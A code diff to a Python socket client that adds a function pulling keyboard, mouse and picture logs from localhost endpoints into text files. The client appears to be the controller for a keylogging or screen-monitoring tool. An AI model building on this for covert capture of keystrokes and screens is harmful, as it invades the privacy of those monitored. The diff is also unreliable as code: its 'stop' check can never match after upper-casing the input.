@@ -1,13 +1,39 @@
 from app._client import Client_socket as csock
 from app.functions import redirect_output
-import asyncio, subprocess, time, queue,threading
+import asyncio, subprocess, time, queue, threading, requests
 
-URL = 'http://localhost:3000/give_me_my_data'
+URLl = 'http://localhost:3000/give_me_my_data'
 threads_done = threading.Event()
 
+def update_log():
+    """ Update log file """
+    
+    print("update log...")
+    print("generate keyboard log...")
+    time.sleep(1)
+    response_keyboard = requests.get("http://localhost:3000/give_me_my_keyboard")
+    with open("./log_keyboard.txt", "a") as file:
+        file.write(str(response_keyboard.content)+"\n")
+        print(str(response_keyboard.content)+"\n")
+        
+    time.sleep(1)    
+    print("generate mouse log...")
+    response_mouse = requests.get("http://localhost:3000/give_me_my_mouse")
+    with open("./log_mouse.txt", "a") as file:
+        file.write(str(response_mouse.content)+"\n")
+        print(str(response_mouse.content)+"\n")
+        
+    time.sleep(1)    
+    print("generate picture log...")
+    response_picture = requests.get("http://localhost:3000/give_me_my_picture")
+    with open("./log_picture.txt", "a") as file:
+        file.write(str(response_picture.content)+"\n")
+        print(str(response_picture.content)+"\n")
+    time.sleep(1)    
 class client:
     """ Main client class """
     
+
     async def ainit(self, force = False) -> None:
         """ Init client """
         self.force = force
@@ -28,7 +54,8 @@ class client:
             if not await generate_csock.ainit(): raise Exception()
             
             
-            print("Server started")
+            
+            print("Server started is running now: Press 'help' for more information\n") 
             while True:
                 while True:
                     if subprocess.Popen.poll(server) != None:# Forced restart if the server is closed by ? entity
@@ -45,11 +72,10 @@ class client:
                             else:
                                 print(line)
                                 line = None
-                        else:
-                            
-                            break
-                inpt = input("Press enter to send a message\n--")
-                if inpt == "stop":break
+                        else:break
+                inpt = input("Press enter to send a message\n--").upper()
+                if inpt == "a".upper() :update_log()
+                elif inpt == "stop":break
                 await generate_csock.send(message=inpt)
                 print("\n---------------------\n")
                 #Give var if none => rien
@@ -57,7 +83,7 @@ class client:
                 
             #run server multiprocess
             #Run while 
-           
+            
         except: 
             time.sleep(5)
             return await self.ainit()
@@ -67,7 +93,7 @@ class client:
     def run_server(self):
         """ Run server on subprocess """
         
-        arguments = ["python", "-u", "m_server.py", f"URL={URL}"]
+        arguments = ["python", "-u", "m_server.py", f"URLl={URLl}"]
         
         server_socket = subprocess.Popen(
             arguments,
@@ -79,6 +105,7 @@ class client:
         return server_socket
     
 if __name__ == "__main__":
+    # update_log()
     asyncio.run(client().ainit())
     
     
